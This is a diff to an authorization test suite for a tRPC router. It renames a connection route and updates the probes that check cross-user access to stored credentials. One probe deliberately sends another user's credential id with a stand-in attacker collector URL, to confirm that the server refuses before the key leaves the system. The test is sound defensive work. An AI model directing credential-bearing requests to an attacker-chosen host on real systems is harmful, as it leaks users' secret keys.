@@ -20,6 +20,7 @@
 // COMPOSED-REAL: the server graph loads in the untimed IMPORT phase, never inside the first test's timeout (#2386 — support/composed-real.ts).
 import "../../support/composed-real.ts";
 import type { ProviderId } from "@orb/contracts/inference";
+import { CONNECTION_OP_CODES } from "@orb/contracts/inference";
 import {
   assets,
   characterDocuments,
@@ -59,7 +60,6 @@ import type {
 } from "@orb/kit/ids";
 import { castId, ID_PREFIX, mintTypeId } from "@orb/kit/ids";
 import type { AutomationService } from "@orb/server/domain/automation";
-import { CONNECTION_OP_CODES } from "@orb/server/domain/connection";
 import { appRouter } from "@orb/server/transport/trpc";
 import { strToU8, zipSync } from "fflate";
 import { describe } from "vitest";
@@ -150,7 +150,7 @@ interface OwnerIds {
   // `tag.setTagOrder` probe sends the reversal; the post-sweep order re-read is the only witness (a
   // single-tag order was un-reversible, so the old probe could not fail — the `regexGlobalOrder*` shape).
   tagOrderBId: TagId;
-  // Branded, not `string`: the `connection.create` / `connection.listEndpointModels` probes hand A's
+  // Branded, not `string`: the `connection.create` / `connection.draftCatalogModels` probes hand A's
   // credential id straight to the wire schema, which is where the credential-reach belt lives.
   credentialId: UserCredentialId;
   // A's connection row (the inference program's §5.3a surface). Every id-taking `connection.*` probe aims
@@ -1662,11 +1662,12 @@ const PROBES: readonly Probe[] = [
   //      • `connectionId` names a row that names a SEALED CREDENTIAL. A dropped `user_connections.owner_id`
   //        predicate does not merely disclose a label — `probe`/`verifyAuth`/`accountCredits`/`catalogModels`
   //        RESOLVE the row through the runtime, which decrypts A's key and dials A's provider on B's behalf.
-  //      • `credentialId` reaches the two verbs that take one from the WIRE (`create`, `listEndpointModels`).
-  //        `listEndpointModels` is the worst case on the whole router: it dials a CALLER-NAMED baseUrl with
-  //        the named credential's bearer attached, so a dropped `credentialOwned` belt is a one-call exfil of
-  //        A's key to an attacker-chosen collector. Both probes name an attacker host / A's credential on
-  //        purpose, and `admitEndpointDraft` must refuse BEFORE any fetch leaves the box.
+  //      • `credentialId` reaches the two verbs that take one from the WIRE (`create`, `draftCatalogModels`).
+  //        `draftCatalogModels` is the worst case on the whole router: for an endpoint draft it dials a
+  //        CALLER-NAMED baseUrl with the named credential's bearer attached, so a dropped `credentialOwned`
+  //        belt is a one-call exfil of A's key to an attacker-chosen collector. The probes name an attacker
+  //        host / A's credential on purpose, and the door's admission
+  //        (`domain/connection/substrate/admission.ts`) must refuse BEFORE any fetch leaves the box.
   //    REFUSAL SHAPE: the domain collapses not-found and not-yours into ONE `DomainOperationError`
   //    (`ConnectionNotFoundError`, deliberately — contract/errors.ts), which maps to BAD_REQUEST +
   //    `connection_not_found`, not the house 404. Each probe declares that exact pair (see `Refusal`): any
@@ -1705,8 +1706,9 @@ const PROBES: readonly Probe[] = [
     refusal: CONNECTION_CREDENTIAL_FOREIGN,
   },
   {
-    path: "connection.listEndpointModels",
-    call: (c, i) => c.connection.listEndpointModels({ baseUrl: "https://collector.attacker.example/v1", credentialId: i.credentialId }),
+    path: "connection.draftCatalogModels",
+    call: (c, i) =>
+      c.connection.draftCatalogModels({ providerId: "custom-openai", baseUrl: "https://collector.attacker.example/v1", credentialId: i.credentialId }),
     refusal: CONNECTION_CREDENTIAL_FOREIGN,
   },
   // The ACTOR axis: a binding list may be read for a rule/plugin actor, and the actor must be the caller's
@@ -1775,7 +1777,7 @@ const EXEMPT: Readonly<Record<string, string>> = {
   // domain int tests. (2026-09-20: `setActive`, `testHealth`, `inspectEndpoint` and the read-shaped
   // `fetchModels` left this router with the @orb/inference cut-over — health/inspection now hang off a
   // CONNECTION, not a credential, as `connection.probe` / `connection.verifyAuth` /
-  // `connection.inspectEndpoint` / `connection.listEndpointModels`, and all four are PROBED above.)
+  // `connection.inspectEndpoint` / `connection.draftCatalogModels`, and all four are PROBED above.)
   "credentials.remove": "keyless-fixture: storage-disabled guard precedes the ownership check",
   "credentials.markRevokedByUser": "keyless-fixture: storage-disabled guard precedes the ownership check",
   "credentials.clearRevoked": "keyless-fixture: storage-disabled guard precedes the ownership check",
